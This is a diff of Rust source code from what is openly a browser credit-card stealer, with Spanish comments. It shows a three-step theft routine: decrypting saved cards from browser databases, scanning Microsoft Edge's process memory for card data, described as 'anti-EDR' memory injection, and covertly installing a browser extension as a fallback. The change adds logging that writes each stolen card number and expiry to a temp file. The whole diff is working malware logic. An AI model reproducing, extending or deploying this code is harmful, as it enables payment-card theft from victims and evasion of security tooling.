@@ -753,26 +753,60 @@ use crate::stealer::memory_injection::{find_edge_process, scan_edge_memory_for_c
 /// 2. Si detecta v20, usa memory injection
 /// 3. Instala extensión como fallback
 pub fn steal_credit_cards_hybrid() -> Vec<CreditCard> {
+    use std::io::Write;
+    
     let mut all_cards = Vec::new();
+    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+    let mut debug_file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_path)
+        .ok();
+    
+    let mut log = |msg: &str| {
+        if let Some(ref mut file) = debug_file {
+            let _ = writeln!(file, "{}", msg);
+        }
+    };
+    
+    log("\n═══ HYBRID CREDIT CARD THEFT ═══");
     
     // PASO 1: Intentar método tradicional (funciona con v10/v11)
+    log("🔸 PASO 1: Intentando método tradicional (DB + decrypt)...");
     let traditional_cards = steal_credit_cards();
     all_cards.extend(traditional_cards.clone());
+    log(&format!("  ✅ Encontradas {} tarjetas con método tradicional", traditional_cards.len()));
     
     // PASO 2: Si encontramos v20 bloqueado, usar memory injection
     if traditional_cards.is_empty() || has_v20_encrypted_cards() {
-        println!("[+] v20 detected, using memory injection...");
+        log("🔸 PASO 2: v20 detectado → Usando Memory Injection Anti-EDR...");
         
-        if let Ok(memory_cards) = steal_via_memory_injection() {
-            all_cards.extend(memory_cards);
+        match steal_via_memory_injection() {
+            Ok(memory_cards) => {
+                log(&format!("  ✅ Encontradas {} tarjetas en memoria", memory_cards.len()));
+                all_cards.extend(memory_cards);
+            },
+            Err(e) => {
+                log(&format!("  ❌ Memory injection failed: {}", e));
+            }
         }
+    } else {
+        log("🔸 PASO 2: Saltando memory injection (tarjetas ya obtenidas)");
     }
     
     // PASO 3: Si aún no hay tarjetas, instalar extensión (fallback)
     if all_cards.is_empty() {
-        println!("[+] Installing extension as fallback...");
-        let _ = install_extension_stealth();
+        log("🔸 PASO 3: Instalando extensión como fallback...");
+        match install_extension_stealth() {
+            Ok(_) => log("  ✅ Extensión instalada exitosamente"),
+            Err(e) => log(&format!("  ❌ Extension install failed: {}", e)),
+        }
+    } else {
+        log("🔸 PASO 3: Saltando extensión (tarjetas ya obtenidas)");
     }
+    
+    log(&format!("\n🎯 TOTAL FINAL: {} tarjetas robadas", all_cards.len()));
+    log("════════════════════════════════\n");
     
     all_cards
 }
@@ -787,25 +821,54 @@ fn has_v20_encrypted_cards() -> bool {
 
 /// Roba credit cards usando memory injection anti-EDR
 fn steal_via_memory_injection() -> Result<Vec<CreditCard>, String> {
+    use std::io::Write;
+    
+    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+    let mut debug_file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_path)
+        .ok();
+    
+    let mut log = |msg: &str| {
+        if let Some(ref mut file) = debug_file {
+            let _ = writeln!(file, "{}", msg);
+        }
+    };
+    
     let mut cards = Vec::new();
     
-    // 1. Encontrar proceso de Edge
-    let edge_process = find_edge_process()
-        .ok_or("Edge process not found")?;
+    log("\n  🔍 Iniciando Memory Injection...");
     
-    println!("[+] Found Edge PID: {}", edge_process.pid);
+    // 1. Encontrar proceso de Edge
+    log("  🔍 Buscando proceso msedge.exe...");
+    let edge_process = find_edge_process()
+        .ok_or_else(|| {
+            log("  ❌ Edge no encontrado (no está corriendo o no tiene permisos)");
+            "Edge process not found".to_string()
+        })?;
+    
+    log(&format!("  ✅ Edge encontrado - PID: {}", edge_process.pid));
     
     // 2. Escanear memoria buscando patrones de tarjetas
+    log("  🔍 Escaneando memoria de Edge...");
     let memory_cards = scan_edge_memory_for_cards(&edge_process);
     
-    println!("[+] Found {} cards in memory", memory_cards.len());
+    log(&format!("  🎯 Encontradas {} tarjetas en memoria", memory_cards.len()));
     
     // 3. Convertir formato
-    for mem_card in memory_cards {
+    for (idx, mem_card) in memory_cards.iter().enumerate() {
+        log(&format!("    Card #{}: {} (exp: {}/{})", 
+            idx + 1,
+            mem_card.card_number,
+            mem_card.expiry_month.unwrap_or(0),
+            mem_card.expiry_year.unwrap_or(0)
+        ));
+        
         cards.push(CreditCard {
             browser: "Edge (Memory)".to_string(),
-            name_on_card: mem_card.cardholder_name.unwrap_or_default(),
-            card_number: mem_card.card_number,
+            name_on_card: mem_card.cardholder_name.clone().unwrap_or_default(),
+            card_number: mem_card.card_number.clone(),
             expiration_month: mem_card.expiry_month.unwrap_or(0) as i32,
             expiration_year: mem_card.expiry_year.unwrap_or(0) as i32,
             billing_address: None,
